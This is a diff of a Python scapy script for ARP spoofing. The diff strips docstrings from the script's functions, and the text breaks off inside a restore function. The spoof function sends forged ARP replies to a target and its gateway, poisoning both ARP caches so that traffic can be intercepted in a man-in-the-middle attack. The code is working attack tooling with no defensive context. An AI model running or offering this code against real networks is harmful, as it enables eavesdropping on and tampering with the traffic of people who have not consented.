@@ -1,22 +1,18 @@
 import scapy.all as scapy
 
 def get_device_info(ip):
-    """Retrieve MAC address for a given IP."""
     broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_req = scapy.ARP(pdst=ip)
     ans = scapy.srp(broadcast/arp_req, timeout=2, verbose=False)[0]
     return (ans[0][1].hwsrc, "Known") if ans else (None, None)
 
 def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
-    """Sends spoofed ARP packets with explicit Ethernet destinations."""
     t_pkt = scapy.Ether(dst=target_mac)/scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
     g_pkt = scapy.Ether(dst=gateway_mac)/scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
-    
     scapy.sendp(t_pkt, verbose=False)
     scapy.sendp(g_pkt, verbose=False)
 
 def restore(dest_ip, src_ip):
-    """Repairs the ARP table of the target and gateway."""
     d_mac, _ = get_device_info(dest_ip)
     s_mac, _ = get_device_info(src_ip)
     if d_mac and s_mac:
